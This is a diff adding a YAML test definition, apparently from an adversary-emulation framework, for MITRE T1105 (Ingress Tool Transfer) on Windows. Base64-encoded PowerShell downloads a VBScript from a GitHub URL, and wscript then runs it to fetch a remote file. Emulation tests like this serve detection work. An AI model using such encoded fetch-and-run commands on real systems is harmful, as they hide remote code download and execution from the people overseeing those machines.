@@ -1,0 +1,20 @@
+- id: be74e4e9-35b6-50ab-8b8e-e622951e01c1
+  name: Soumaia ART Tests - Download a file using wscript
+  description: Use wscript to run a local VisualBasic file to download a remote file
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAxADAANQAtAGQAbwB3AG4AbABvAGEAZAAtAGYAaQBsAGUALgB2AGIAcwAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMQAwADUALQBkAG8AdwBuAGwAbwBhAGQALQBmAGkAbABlAC4AdgBiAHMAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAxADAANQAvAHMAcgBjAC8AVAAxADEAMAA1AC0AZABvAHcAbgBsAG8AYQBkAC0AZgBpAGwAZQAuAHYAYgBzACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABUADEAMQAwADUALQBkAG8AdwBuAGwAbwBhAGQALQBmAGkAbABlAC4AdgBiAHMAIgAKAA==
+          )
+          wscript.exe ".\T1105-download-file.vbs"
+        cleanup: |-
+          del Atomic-License.txt >nul 2>&1
+        payloads:
+        - T1105-download-file.vbs
